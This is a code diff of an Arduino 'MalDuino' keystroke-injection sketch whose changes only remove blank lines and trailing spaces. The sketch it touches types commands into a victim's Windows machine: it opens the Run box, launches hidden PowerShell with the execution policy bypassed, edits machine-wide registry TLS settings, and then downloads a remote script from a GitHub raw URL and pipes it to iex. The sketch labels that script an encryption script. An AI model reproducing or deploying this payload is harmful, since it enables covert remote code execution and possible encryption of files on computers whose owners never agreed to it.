@@ -37,7 +37,6 @@ void setup() {
 
   /* ----- Begin-Payload -----*/
   delay(1000);            // extra 1s delay, can be adjusted if needed
-
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(114);
   Keyboard.releaseAll();
@@ -50,7 +49,6 @@ void setup() {
   delay(defaultDelay);
   typeKey(KEY_RETURN);
   delay(defaultDelay);
-
   // change windows registry ssl/tsl settings to allow executing powershell script directly from github or other url
   Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -Force}");
   delay(defaultDelay);
@@ -79,10 +77,9 @@ void setup() {
   Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\.NETFramework\\\\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64}");
   delay(defaultDelay);
   typeKey(KEY_RETURN);
-
   // run encryption script directly from github
   delay(defaultDelay);
-  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"$type='single_enc'; $file='test.txt'; $file_path='h:'; $show_screen='no'; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1') | iex\"");  
+  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"$type='single_enc'; $file='test.txt'; $file_path='h:'; $show_screen='no'; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1') | iex\"");
   delay(defaultDelay);
   typeKey(KEY_RETURN);
   delay(defaultDelay);
